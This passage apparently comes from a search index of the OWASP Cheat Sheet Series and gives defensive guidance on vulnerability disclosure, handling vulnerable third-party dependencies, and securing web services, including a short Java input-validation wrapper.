certain configurations are affected). Any workarounds or mitigation that can be implemented as a temporary fix. A CVE for the vulnerability. Where possible it is also good to include: The timeline of the vulnerability disclosure process. Credit for the researcher who identified the vulnerability. Technical details of the vulnerability. IDS/IPS signatures or other indicators of compromise. Security advisories should be easy for developers and system administrators to find. Common ways to publish them include: A dedicated \"security\" or \"security advisories\" page on the website. A security mailing list or forum. Linked from the main changelogs and release notes. Some researchers may publish their own technical write ups of the vulnerability, which will usually include the full details required to exploit it (and sometimes even working exploit code). For more serious vulnerabilities, it may be sensible to ask the researcher to delay publishing the full details for a period of time (such as a week), in order to give system administrators more time to install the patches before exploit code is available. However, once the patch has been releases, attackers will be able to reverse engineer the vulnerability and develop their own exploit code, so there is limited value to delaying the full release.","title":"Commercial and Open Source Software"},{"location":"cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html#private-systems","text":"For vulnerabilities in private systems, a decision needs to be made about whether the details should be published once the vulnerability has been resolved. Most bug bounty programs give organisations the option about whether to disclose the details once the issue has been resolved, although it is not typically required. Publishing these details helps to demonstrate that that the organisation is taking proactive and transparent approach to security, but can also result in potentially embarrassing omissions and misconfigurations being made public. In the event of a future compromise or data breach, they could also potentially be used as evidence of a weak security culture within the organisation. Additionally, they may expose technical details about internal, and could help attackers identify other similar issues. As such, this decision should be carefully evaluated, and it may be wise to take legal advice.","title":"Private Systems"},{"location":"cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html#rewarding-researchers","text":"Where researchers have identified and reported vulnerabilities outside of a bug bounty program (essentially providing free security testing), and have acted professionally and helpfully throughout the vulnerability disclosure process, it is good to offer them some kind of reward to encourage this kind of positive interaction in future. If monetary rewards are not possible then a number of other options should be considered, such as: Discounts or credit for services or products offered by the organisation. Virtual rewards (such as special in-game items, custom avatars, etc). T-shirts, stickers and other branded items (swag). Credit in a \"hall of fame\", or other similar acknowledgement.","title":"Rewarding Researchers"},{"location":"cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html#further-reading","text":"The CERT Guide to Coordinated Vulnerability Disclosure HackerOne's Vulnerability Disclosure Guidelines Disclose.io's Vulnerability Disclosure Terms","title":"Further Reading"},{"location":"cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html","text":"Vulnerable Dependency Management Cheat Sheet \u00b6 Introduction \u00b6 The objective of the cheat sheet is to provide a proposal of approach regarding the handling of vulnerable third-party dependencies when they are detected, and this, depending on different situation. The cheat sheet is not tools oriented but it contains a tools section informing the reader about free and commercial solutions that can be used to detect vulnerable dependencies, depending on the level of support on the technologies at hand Note: Proposals mentioned in this cheat sheet are not silver-bullet (recipes that work in all situations) yet can be used as a foundation and adapted to your context. Context \u00b6 Most of the projects use third-party dependencies to delegate handling of different kind of operations, e.g. generation of document in a specific format, HTTP communications, data parsing of a specific format, etc. It's a good approach because it allows the development team to focus on the real application code supporting the expected business feature. The dependency brings forth an expected downside where the security posture of the real application is now resting on it. This aspect is referenced in the following projects: OWASP TOP 10 2017 under the point A9 - Using Components with Known Vulnerabilities . OWASP Application Security Verification Standard Project under the section V14.2 Dependency . Based on this context, it's important for a project to ensure that all the third-party dependencies implemented are clean of any security issue, and if they happen to contain any security issues, the development team needs to be aware of it and apply the required mitigation measures to secure the affected application. It's highly recommended to perform automated analysis of the dependencies from the birth of the project. Indeed, if this task is added at the middle or end of the project, it can imply a huge amount of work to handle all the issues identified and that will in turn impose a huge burden on the development team and might to blocking the advancement of the project at hand. Note: In the rest of the cheat sheet, when we refer to development team then we assume that the team contains a member with the required application security skills or can refer to someone in the company having these kind of skills to analyse the vulnerability impacting the dependency. Remark about the detection \u00b6 It's important to keep in mind the different ways in which a security issue is handled after its discovery. 1. Responsible disclosure \u00b6 See a description here . A researcher discovers a vulnerability in a component, and after collaboration with the component provider, they issue a CVE (sometimes a specific vulnerability identifier to the provider is created but generally a CVE identifier is preferred) associated to the issue allowing the public referencing of the issue as well as the available fixation/mitigation. If in case the provider doesn't properly cooperate with the researcher, the following results are expected: CVE gets accepted by the vendor yet the provider refuses to fix the issue . Most of the time, if the researcher doesn't receive back a response in 30 days, they go ahead and do a full disclosure of the vulnerability. Here, the vulnerability is always referenced in the CVE global database used, generally, by the detection tools as one of the several input sources used. 2. Full disclosure \u00b6 See a description here , into the section named Computers about Computer Security . The researcher decides to release all the information including exploitation code/method on services like Full Disclosure mailing list , Exploit-DB . Here a CVE is not always created then the vulnerability is not always in the CVE global database causing the detection tools to be potentially blind about unless the tools use other input sources. Remark about the security issue handling decision \u00b6 When a security issue is detected, it's possible to decide to accept the risk represented by the security issue. However, this decision must be taken by the Chief Risk Officer (fallback possible to Chief Information Security Officer ) of the company based on technical feedback from the development team that have analyzed the issue (see the Cases section) as well as the CVEs CVSS score indicators. Cases \u00b6 When a security issue is detected, the development team can meet one of the situations (named Case in the rest of the cheat sheet) presented in the sub sections below. If the vulnerably impact a transitive dependency then the action will be taken on the direct dependency of the project because acting on a transitive dependency often impact the stability of the application. Acting on a on a transitive dependency require the development team to fully understand the complete relation/communication/usage from the project first level dependency until the dependency impacted by the security vulnerability, this task is very time consuming. Case 1 \u00b6 Context \u00b6 Patched version of the component has been released by the provider. Ideal condition of application of the approach \u00b6 Set of automated unit or integration or functional or security tests exist for the features of the application using the impacted dependency allowing to validate that the feature is operational. Approach \u00b6 Step 1: Update the version of the dependency in the project on a testing environment. Step 2: Prior to running the tests, 2 output paths are possible: All tests succeed, and thus the update can be pushed to production. One or several tests failed, several output paths are possible: Failure is due to change in some function calls ( e.g. signature, argument, package, etc.). The development team must update their code to fit the new library. Once that is done, re-run the tests. Technical incompatibility of the released dependency ( e.g. require a more recent runtime version) which leads to the following actions: Raise the issue to the provider. Apply Case 2 while waiting for the provider's feedback. Case 2 \u00b6 Context \u00b6 Provider informs the team that it will take a while to fix the issue and, so, a patched version will not be available before months. Ideal condition of application of the approach \u00b6 Provider can share any of the below with the development team: The exploitation code. The list of impacted functions by the vulnerability. A workaround to prevent the exploitation of the issue. Approach \u00b6 Step 1: If a workaround is provided, it should be applied and validated on the testing environment, and thereafter deployed to production. If the provider has given the team a list of the impacted functions, protective code must wrap the calls to these functions to ensure that the input and the output data is safe. Moreover, security devices, such as the Web Application Firewall (WAF), can handle such issues by protecting the internal applications through parameter validation and by generating detection rules for those specific libraries. Yet, in this cheat sheet, the focus is set on the application level in order to patch the vulnerability as close as possible to the source. Example using java code in which the impacted function suffers from a Remote Code Execution issue: public void callFunctionWithRCEIssue ( String externalInput ){ //Apply input validation on the external input using regex if ( Pattern . matches ( \"[a-zA-Z0-9]{1,50}\" , externalInput )){ //Call the flawed function using safe input functionWithRCEIssue ( externalInput ); } else { //Log the detection of exploitation SecurityLogger . warn ( \"Exploitation of the RCE issue XXXXX detected !\" ); //Raise an exception leading to a generic error send to the client... } } If the provider has provided nothing about the vulnerability, Case 3 can be applied skipping the step 2 of this case. We assume here that, at least, the CVE has been provided. Step 2: If the provider has provided the team with the exploitation code, and the team made a security wrapper around the vulnerable library/code, execute the exploitation code in order to ensure that the library is now secure and doesn't affect the application. If you have a set of automated unit or integration or functional or security tests that exist for the application, run them to verify that the protection code added does not impact the stability of the application. Add a comment in the project README explaining that the issue (specify the related CVE ) is handled during the waiting time of a patched version because the detection tool will continue to raise an alert on this dependency. Note: You can add the dependency to the ignore list but the ignore scope for this dependency must only cover the CVE related to the vulnerability because a dependency can be impacted by several vulnerabilities having each one its own CVE . Case 3 \u00b6 Context \u00b6 Provider inform the team that he cannot fix the issue, so no patched version will be released at all (applies also if provider does not want to fix the issue or does not answer at all). In this case the only information given to the development team is the CVE . Notes: This case is really complex and time consuming and is generally used as last resort. If the impacted dependency is an open source library then we, the development team, can create a patch and create pull request - that way we can protect our company/application from the source as well as helping others secure their applications. Ideal condition of application of the approach \u00b6 Nothing specific because here we are in a patch yourself condition. Approach \u00b6 Step 1: If we are in this case due to one of the following conditions, it's a good idea to start a parallel study to find another component better maintained or if it's a commercial component with support then put pressure on the provider with the help of your Chief Risk Officer (fallback possible to Chief Information Security Officer ): Provider does not want to fix the issue. Provider does not answer at all. In all cases, here, we need to handle the vulnerability right now. Step 2: As we know the vulnerable dependency, we know where it is used in the application (if it's a transitive dependency then we can identify the first level dependency using it using the IDE built-in feature or the dependency management system used (Maven, Gradle, Nuget, npm, etc.). Note that IDE is also used to identify the calls to the dependency. Identifying calls to this dependency is fine but it is the first step. The team still lacks information on what kind of patching needs to be performed. To obtain these informations, the team uses the CVE content to know which kind of vulnerability affects the dependency. The description property provides the answer: SQL injection, Remote Code Execution, Cross-Site Scripting, Cross-Site Request Forgery, etc. After identifying the above 2 points, the team is aware of the type of patching that needs to be taken ( Case 2 with the protective code) and where to add it. Example: The team has an application using the Jackson API in a version exposed to the CVE-2016-3720 . The description of the CVE is as follows: XML external entity (XXE) vulnerability in XmlMapper in the Data format extension for Jackson (aka jackson-dataformat-xml) allows attackers to have unspecified impact via unknown vectors. Based on these information, the team determines that the necessary patching will be to add a pre-validation of any XML data passed to the Jakson API to prevent XML external entity (XXE) vulnerability. Step 3: If possible, create a unit test that mimics the vulnerability in order to ensure that the patch is effective and have a way to continuously ensure that the patch is in place during the evolution of the project. If you have a set of automated unit or integration or functional or security tests that exists for the application then run them to verify that the patch does not impact the stability of the application. Case 4 \u00b6 Context \u00b6 The vulnerable dependency is found during one of the following situation in which the provider is not aware of the vulnerability: Via the discovery of a full disclosure post on the Internet. During a penetration test. Ideal condition of application of the approach \u00b6 Provider collaborates with you after being notified of the vulnerability. Approach \u00b6 Step 1: Inform the provider about the vulnerability by sharing the post with them. Step 2: Using the information from the full disclosure post or the pentester's exploitation feedback, if the provider collaborates then apply Case 2 , otherwise apply Case 3 , and instead of analyzing the CVE information, the team needs to analyze the information from the full disclosure post/pentester's exploitation feedback. Tools \u00b6 This section lists several tools that can used to analyse the dependencies used by a project in order to detect the vulnerabilities. It's important to ensure, during the selection process of a vulnerable dependency detection tool, that this one: Uses several reliable input sources in order to handle both vulnerability disclosure ways. Support for flagging an issue raised on a component as a false-positive . Free OWASP Dependency Check : Full support: Java, .Net. Experimental support: Python, Ruby, PHP (composer), NodeJS, C, C++. NPM Audit Full support: NodeJS, JavaScript. HTML report available via this module . OWASP Dependency Track can be used to manage vulnerable dependencies across an organization. Commercial Snyk (open source and free option available): Full support for many languages and package manager. JFrog XRay : Full support for many languages and package manager. Renovate (allow to detect old dependencies): Full support for many languages and package manager. Requires.io (allow to detect old dependencies - open source and free option available): Full support : Python only.","title":"Vulnerable Dependency Management"},{"location":"cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html#vulnerable-dependency-management-cheat-sheet","text":"","title":"Vulnerable Dependency Management Cheat Sheet"},{"location":"cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html#introduction","text":"The objective of the cheat sheet is to provide a proposal of approach regarding the handling of vulnerable third-party dependencies when they are detected, and this, depending on different situation. The cheat sheet is not tools oriented but it contains a tools section informing the reader about free and commercial solutions that can be used to detect vulnerable dependencies, depending on the level of support on the technologies at hand Note: Proposals mentioned in this cheat sheet are not silver-bullet (recipes that work in all situations) yet can be used as a foundation and adapted to your context.","title":"Introduction"},{"location":"cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html#context","text":"Most of the projects use third-party dependencies to delegate handling of different kind of operations, e.g. generation of document in a specific format, HTTP communications, data parsing of a specific format, etc. It's a good approach because it allows the development team to focus on the real application code supporting the expected business feature. The dependency brings forth an expected downside where the security posture of the real application is now resting on it. This aspect is referenced in the following projects: OWASP TOP 10 2017 under the point A9 - Using Components with Known Vulnerabilities . OWASP Application Security Verification Standard Project under the section V14.2 Dependency . Based on this context, it's important for a project to ensure that all the third-party dependencies implemented are clean of any security issue, and if they happen to contain any security issues, the development team needs to be aware of it and apply the required mitigation measures to secure the affected application. It's highly recommended to perform automated analysis of the dependencies from the birth of the project. Indeed, if this task is added at the middle or end of the project, it can imply a huge amount of work to handle all the issues identified and that will in turn impose a huge burden on the development team and might to blocking the advancement of the project at hand. Note: In the rest of the cheat sheet, when we refer to development team then we assume that the team contains a member with the required application security skills or can refer to someone in the company having these kind of skills to analyse the vulnerability impacting the dependency.","title":"Context"},{"location":"cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html#remark-about-the-detection","text":"It's important to keep in mind the different ways in which a security issue is handled after its discovery.","title":"Remark about the detection"},{"location":"cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html#1-responsible-disclosure","text":"See a description here . A researcher discovers a vulnerability in a component, and after collaboration with the component provider, they issue a CVE (sometimes a specific vulnerability identifier to the provider is created but generally a CVE identifier is preferred) associated to the issue allowing the public referencing of the issue as well as the available fixation/mitigation. If in case the provider doesn't properly cooperate with the researcher, the following results are expected: CVE gets accepted by the vendor yet the provider refuses to fix the issue . Most of the time, if the researcher doesn't receive back a response in 30 days, they go ahead and do a full disclosure of the vulnerability. Here, the vulnerability is always referenced in the CVE global database used, generally, by the detection tools as one of the several input sources used.","title":"1. Responsible disclosure"},{"location":"cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html#2-full-disclosure","text":"See a description here , into the section named Computers about Computer Security . The researcher decides to release all the information including exploitation code/method on services like Full Disclosure mailing list , Exploit-DB . Here a CVE is not always created then the vulnerability is not always in the CVE global database causing the detection tools to be potentially blind about unless the tools use other input sources.","title":"2. Full disclosure"},{"location":"cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html#remark-about-the-security-issue-handling-decision","text":"When a security issue is detected, it's possible to decide to accept the risk represented by the security issue. However, this decision must be taken by the Chief Risk Officer (fallback possible to Chief Information Security Officer ) of the company based on technical feedback from the development team that have analyzed the issue (see the Cases section) as well as the CVEs CVSS score indicators.","title":"Remark about the security issue handling decision"},{"location":"cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html#cases","text":"When a security issue is detected, the development team can meet one of the situations (named Case in the rest of the cheat sheet) presented in the sub sections below. If the vulnerably impact a transitive dependency then the action will be taken on the direct dependency of the project because acting on a transitive dependency often impact the stability of the application. Acting on a on a transitive dependency require the development team to fully understand the complete relation/communication/usage from the project first level dependency until the dependency impacted by the security vulnerability, this task is very time consuming.","title":"Cases"},{"location":"cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html#case-1","text":"","title":"Case 1"},{"location":"cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html#context_1","text":"Patched version of the component has been released by the provider.","title":"Context"},{"location":"cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html#ideal-condition-of-application-of-the-approach","text":"Set of automated unit or integration or functional or security tests exist for the features of the application using the impacted dependency allowing to validate that the feature is operational.","title":"Ideal condition of application of the approach"},{"location":"cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html#approach","text":"Step 1: Update the version of the dependency in the project on a testing environment. Step 2: Prior to running the tests, 2 output paths are possible: All tests succeed, and thus the update can be pushed to production. One or several tests failed, several output paths are possible: Failure is due to change in some function calls ( e.g. signature, argument, package, etc.). The development team must update their code to fit the new library. Once that is done, re-run the tests. Technical incompatibility of the released dependency ( e.g. require a more recent runtime version) which leads to the following actions: Raise the issue to the provider. Apply Case 2 while waiting for the provider's feedback.","title":"Approach"},{"location":"cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html#case-2","text":"","title":"Case 2"},{"location":"cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html#context_2","text":"Provider informs the team that it will take a while to fix the issue and, so, a patched version will not be available before months.","title":"Context"},{"location":"cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html#ideal-condition-of-application-of-the-approach_1","text":"Provider can share any of the below with the development team: The exploitation code. The list of impacted functions by the vulnerability. A workaround to prevent the exploitation of the issue.","title":"Ideal condition of application of the approach"},{"location":"cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html#approach_1","text":"Step 1: If a workaround is provided, it should be applied and validated on the testing environment, and thereafter deployed to production. If the provider has given the team a list of the impacted functions, protective code must wrap the calls to these functions to ensure that the input and the output data is safe. Moreover, security devices, such as the Web Application Firewall (WAF), can handle such issues by protecting the internal applications through parameter validation and by generating detection rules for those specific libraries. Yet, in this cheat sheet, the focus is set on the application level in order to patch the vulnerability as close as possible to the source. Example using java code in which the impacted function suffers from a Remote Code Execution issue: public void callFunctionWithRCEIssue ( String externalInput ){ //Apply input validation on the external input using regex if ( Pattern . matches ( \"[a-zA-Z0-9]{1,50}\" , externalInput )){ //Call the flawed function using safe input functionWithRCEIssue ( externalInput ); } else { //Log the detection of exploitation SecurityLogger . warn ( \"Exploitation of the RCE issue XXXXX detected !\" ); //Raise an exception leading to a generic error send to the client... } } If the provider has provided nothing about the vulnerability, Case 3 can be applied skipping the step 2 of this case. We assume here that, at least, the CVE has been provided. Step 2: If the provider has provided the team with the exploitation code, and the team made a security wrapper around the vulnerable library/code, execute the exploitation code in order to ensure that the library is now secure and doesn't affect the application. If you have a set of automated unit or integration or functional or security tests that exist for the application, run them to verify that the protection code added does not impact the stability of the application. Add a comment in the project README explaining that the issue (specify the related CVE ) is handled during the waiting time of a patched version because the detection tool will continue to raise an alert on this dependency. Note: You can add the dependency to the ignore list but the ignore scope for this dependency must only cover the CVE related to the vulnerability because a dependency can be impacted by several vulnerabilities having each one its own CVE .","title":"Approach"},{"location":"cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html#case-3","text":"","title":"Case 3"},{"location":"cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html#context_3","text":"Provider inform the team that he cannot fix the issue, so no patched version will be released at all (applies also if provider does not want to fix the issue or does not answer at all). In this case the only information given to the development team is the CVE . Notes: This case is really complex and time consuming and is generally used as last resort. If the impacted dependency is an open source library then we, the development team, can create a patch and create pull request - that way we can protect our company/application from the source as well as helping others secure their applications.","title":"Context"},{"location":"cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html#ideal-condition-of-application-of-the-approach_2","text":"Nothing specific because here we are in a patch yourself condition.","title":"Ideal condition of application of the approach"},{"location":"cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html#approach_2","text":"Step 1: If we are in this case due to one of the following conditions, it's a good idea to start a parallel study to find another component better maintained or if it's a commercial component with support then put pressure on the provider with the help of your Chief Risk Officer (fallback possible to Chief Information Security Officer ): Provider does not want to fix the issue. Provider does not answer at all. In all cases, here, we need to handle the vulnerability right now. Step 2: As we know the vulnerable dependency, we know where it is used in the application (if it's a transitive dependency then we can identify the first level dependency using it using the IDE built-in feature or the dependency management system used (Maven, Gradle, Nuget, npm, etc.). Note that IDE is also used to identify the calls to the dependency. Identifying calls to this dependency is fine but it is the first step. The team still lacks information on what kind of patching needs to be performed. To obtain these informations, the team uses the CVE content to know which kind of vulnerability affects the dependency. The description property provides the answer: SQL injection, Remote Code Execution, Cross-Site Scripting, Cross-Site Request Forgery, etc. After identifying the above 2 points, the team is aware of the type of patching that needs to be taken ( Case 2 with the protective code) and where to add it. Example: The team has an application using the Jackson API in a version exposed to the CVE-2016-3720 . The description of the CVE is as follows: XML external entity (XXE) vulnerability in XmlMapper in the Data format extension for Jackson (aka jackson-dataformat-xml) allows attackers to have unspecified impact via unknown vectors. Based on these information, the team determines that the necessary patching will be to add a pre-validation of any XML data passed to the Jakson API to prevent XML external entity (XXE) vulnerability. Step 3: If possible, create a unit test that mimics the vulnerability in order to ensure that the patch is effective and have a way to continuously ensure that the patch is in place during the evolution of the project. If you have a set of automated unit or integration or functional or security tests that exists for the application then run them to verify that the patch does not impact the stability of the application.","title":"Approach"},{"location":"cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html#case-4","text":"","title":"Case 4"},{"location":"cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html#context_4","text":"The vulnerable dependency is found during one of the following situation in which the provider is not aware of the vulnerability: Via the discovery of a full disclosure post on the Internet. During a penetration test.","title":"Context"},{"location":"cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html#ideal-condition-of-application-of-the-approach_3","text":"Provider collaborates with you after being notified of the vulnerability.","title":"Ideal condition of application of the approach"},{"location":"cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html#approach_3","text":"Step 1: Inform the provider about the vulnerability by sharing the post with them. Step 2: Using the information from the full disclosure post or the pentester's exploitation feedback, if the provider collaborates then apply Case 2 , otherwise apply Case 3 , and instead of analyzing the CVE information, the team needs to analyze the information from the full disclosure post/pentester's exploitation feedback.","title":"Approach"},{"location":"cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html#tools","text":"This section lists several tools that can used to analyse the dependencies used by a project in order to detect the vulnerabilities. It's important to ensure, during the selection process of a vulnerable dependency detection tool, that this one: Uses several reliable input sources in order to handle both vulnerability disclosure ways. Support for flagging an issue raised on a component as a false-positive . Free OWASP Dependency Check : Full support: Java, .Net. Experimental support: Python, Ruby, PHP (composer), NodeJS, C, C++. NPM Audit Full support: NodeJS, JavaScript. HTML report available via this module . OWASP Dependency Track can be used to manage vulnerable dependencies across an organization. Commercial Snyk (open source and free option available): Full support for many languages and package manager. JFrog XRay : Full support for many languages and package manager. Renovate (allow to detect old dependencies): Full support for many languages and package manager. Requires.io (allow to detect old dependencies - open source and free option available): Full support : Python only.","title":"Tools"},{"location":"cheatsheets/Web_Service_Security_Cheat_Sheet.html","text":"Web Service Security Cheat Sheet \u00b6 Introduction \u00b6 This article is focused on providing guidance for securing web services and preventing web services related attacks. Please notice that due to the difference in implementation between different frameworks, this cheat sheet is kept at a high level. Transport Confidentiality \u00b6 Transport confidentiality protects against eavesdropping and man-in-the-middle attacks against web service communications to/from the server. Rule : All communication with and between web services containing sensitive features, an authenticated session, or transfer of sensitive data must be encrypted using well-configured TLS . This is recommended even if the messages themselves are encrypted because TLS provides numerous benefits beyond traffic confidentiality including integrity protection, replay defenses, and server authentication. For more information on how to do this properly see the Transport Layer Protection Cheat Sheet . Server Authentication \u00b6 Rule : TLS must be used to authenticate the service provider to the service consumer. The service consumer should verify the server certificate is issued by a trusted provider, is not expired, is not revoked, matches the domain name of the service, and that the server has proven that it has the private key associated with the public key certificate (by properly signing something or successfully decrypting something encrypted with the associated public key). User Authentication \u00b6 User authentication verifies the identity of the user or the system trying to connect to the service. Such authentication is usually a function of the container of the web service. Rule : If used, Basic Authentication must be conducted over TLS , but Basic Authentication is not recommended. Rule : Client Certificate Authentication using TLS is a strong form of authentication that is recommended. Transport Encoding \u00b6 SOAP encoding styles are meant to move data between software objects into XML format and back again. Rule : Enforce the same encoding style between the client and the server. Message Integrity \u00b6 This is for data at rest. The integrity of data in transit can easily be provided by TLS . When using public key cryptography , encryption does guarantee confidentiality but it does not guarantee integrity since the receiver's public key is public. For the same reason, encryption does not ensure the identity of the sender. Rule : For XML data, use XML digital signatures to provide message integrity using the sender's private key. This signature can be validated by the recipient using the sender's digital certificate (public key). Message Confidentiality \u00b6 Data elements meant to be kept confidential must be encrypted using a strong encryption cipher with an adequate key length to deter brute-forcing. Rule : Messages containing sensitive data must be encrypted using a strong encryption cipher. This could be transport encryption or message encryption. Rule : Messages containing sensitive data that must remain encrypted at rest after receipt must be encrypted with strong data encryption, not just transport encryption. Authorization \u00b6 Web services need to authorize web service clients the same way web applications authorize users. A web service needs to make sure a web service client is authorized to perform a certain action (coarse-grained) on the requested data (fine-grained). Rule : A web service should authorize its clients whether they have access to the method in question. Following authentication, the web service should check the privileges of the requesting entity whether they have access to the requested resource. This should be done on every request. Rule : Ensure access to administration and management functions within the Web Service Application is limited to web service administrators. Ideally, any administrative capabilities would be in an application that is completely separate from the web services being managed by these capabilities, thus completely separating normal users from these sensitive functions. Schema Validation \u00b6 Schema validation enforces constraints and syntax defined by the schema. Rule : Web services must validate SOAP payloads against their associated XML schema definition ( XSD ). Rule : The XSD defined for a SOAP web service should, at a minimum, define the maximum length and character set of every parameter allowed to pass into and out of the web service. Rule : The XSD defined for a SOAP web service should define strong (ideally white list) validation patterns for all fixed format parameters (e.g., zip codes, phone numbers, list values, etc.). Content Validation \u00b6 Rule : Like any web application, web services need to validate input before consuming it. Content validation for XML input should include: Validation against malformed XML entities. Validation against XML Bomb attacks . Validating inputs using a strong white list. Validating against external entity attacks . Output Encoding \u00b6 Web services need to ensure that the output sent to clients is encoded to be consumed as data and not as scripts. This gets pretty important when web service clients use the output to render HTML pages either directly or indirectly using AJAX objects. Rule : All the rules of output encoding applies as per Cross Site Scripting Prevention Cheat Sheet . Virus Protection \u00b6 SOAP provides the ability to attach files and documents to SOAP messages. This gives the opportunity for hackers to attach viruses and malware to these SOAP messages. Rule : Ensure Virus Scanning technology is installed and preferably inline so files and attachments could be checked before being saved on disk. Rule : Ensure Virus Scanning technology is regularly updated with the latest virus definitions/rules. Message Size \u00b6 Web services like web applications could be a target for DOS attacks by automatically sending the web services thousands of large size SOAP messages. This either cripples the application making it unable to respond to legitimate messages or it could take it down entirely. Rule : SOAP Messages size should be limited to an appropriate size limit. Larger size limit (or no limit at all) increases the chances of a successful DoS attack. Availability \u00b6 Resources Limiting \u00b6 During regular operation, web services require computational power such as CPU cycles and memory. Due to malfunctioning or while under attack, a web service may required too much resources, leaving the host system unstable. Rule : Limit the amount of CPU cycles the web service can use based on expected service rate, in order to have a stable system. Rule : Limit the amount of memory the web service can use to avoid system running out of memory. In some cases the host system may start killing processes to free up memory. Rule : Limit the number of simultaneous open files, network connections and started processes. Message Throughput \u00b6 Throughput represents the number of web service requests served during a specific amount of time. Rule : Configuration should be optimized for maximum message throughput to avoid running into DoS-like situations. XML Denial of Service Protection \u00b6 XML Denial of Service is probably the most serious attack against web services. So the web service must provide the following validation: Rule : Validation against recursive payloads. Rule : Validation against oversized payloads. Rule : Protection against XML entity expansion . Rule : Validating against overlong element names. If you are working with SOAP -based Web Services, the element names are those SOAP Actions. This protection should be provided by your XML parser/schema validator. To verify, build test cases to make sure your parser to resistant to these types of attacks. Endpoint Security Profile \u00b6 Rule : Web services must be compliant with Web Services-Interoperability (WS-I) Basic Profile at minimum.","title":"Web Service Security"},{"location":"cheatsheets/Web_Service_Security_Cheat_Sheet.html#web-service-security-cheat-sheet","text":"","title":"Web Service Security Cheat Sheet"},{"location":"cheatsheets/Web_Service_Security_Cheat_Sheet.html#introduction","text":"This article is focused on providing guidance for securing web services and preventing web services related attacks. Please notice that due to the difference in implementation between different frameworks, this cheat sheet is kept at a high level.","title":"Introduction"},{"location":"cheatsheets/Web_Service_Security_Cheat_Sheet.html#transport-confidentiality","text":"Transport confidentiality protects against eavesdropping and man-in-the-middle attacks against web service communications to/from the server. Rule : All communication with and between web services containing sensitive features, an authenticated session, or transfer of sensitive data must be encrypted using well-configured TLS . This is recommended even if the messages themselves are encrypted because TLS provides numerous benefits beyond traffic confidentiality including integrity protection, replay defenses, and server authentication. For more information on how to do this properly see the Transport Layer Protection Cheat Sheet .","title":"Transport Confidentiality"},{"location":"cheatsheets/Web_Service_Security_Cheat_Sheet.html#server-authentication","text":"Rule : TLS must be used to authenticate the service provider to the service consumer. The service consumer should verify the server certificate is issued by a trusted provider, is not expired, is not revoked, matches the domain name of the service, and that the server has proven that it has the private key associated with the public key certificate (by properly signing something or successfully decrypting something encrypted with the associated public key).","title":"Server Authentication"},{"location":"cheatsheets/Web_Service_Security_Cheat_Sheet.html#user-authentication","text":"User authentication verifies the identity of the user or the system trying to connect to the service. Such authentication is usually a function of the container of the web service. Rule : If used, Basic Authentication must be conducted over TLS , but Basic Authentication is not recommended. Rule : Client Certificate Authentication using TLS is a strong form of authentication that is recommended.","title":"User Authentication"},{"location":"cheatsheets/Web_Service_Security_Cheat_Sheet.html#transport-encoding","text":"SOAP encoding styles are meant to move data between software objects into XML format and back again. Rule : Enforce the same encoding style between the client and the server.","title":"Transport Encoding"},{"location":"cheatsheets/Web_Service_Security_Cheat_Sheet.html#message-integrity","text":"This is for data at rest. The integrity of data in transit can easily be provided by TLS . When using public key cryptography , encryption does guarantee confidentiality but it does not guarantee integrity since the receiver's public key is public. For the same reason, encryption does not ensure the identity of the sender. Rule : For XML data, use XML digital signatures to provide message integrity using the sender's private key. This signature can be validated by the recipient using the sender's digital certificate (public key).","title":"Message Integrity"},{"location":"cheatsheets/Web_Service_Security_Cheat_Sheet.html#message-confidentiality","text":"Data elements meant to be kept confidential must be encrypted using a strong encryption cipher with an adequate key length to deter brute-forcing. Rule : Messages containing sensitive data must be encrypted using a strong encryption cipher. This could be transport encryption or message encryption. Rule : Messages containing sensitive data that must remain encrypted at rest after receipt must be encrypted with strong data encryption, not just transport encryption.","title":"Message Confidentiality"},{"location":"cheatsheets/Web_Service_Security_Cheat_Sheet.html#authorization","text":"Web services need to authorize web service clients the same way web applications authorize users. A web service needs to make sure a web service client is authorized to perform a certain action (coarse-grained) on the requested data (fine-grained). Rule : A web service should authorize its clients whether they have access to the method in question. Following authentication, the web service should check the privileges of the requesting entity whether they have access to the requested resource. This should be done on every request. Rule : Ensure access to administration and management functions within the Web Service Application is limited to web service administrators. Ideally, any administrative capabilities would be in an application that is completely separate from the web services being managed by these capabilities, thus completely separating normal users from these sensitive functions.","title":"Authorization"},{"location":"cheatsheets/Web_Service_Security_Cheat_Sheet.html#schema-validation","text":"Schema validation enforces constraints and syntax defined by the schema. Rule : Web services must validate SOAP payloads against their associated XML schema definition ( XSD ). Rule : The XSD defined for a SOAP web service should, at a minimum, define the maximum length and character set of every parameter allowed to pass into and out of the web service. Rule : The XSD defined for a SOAP web service should define strong (ideally white list) validation patterns for all fixed format parameters (e.g., zip codes, phone numbers, list values, etc.).","title":"Schema Validation"},{"location":"cheatsheets/Web_Service_Security_Cheat_Sheet.html#content-validation","text":"Rule : Like any web application, web services need to validate input before consuming it. Content validation for XML input should include: Validation against malformed XML entities. Validation against XML Bomb attacks . Validating inputs using 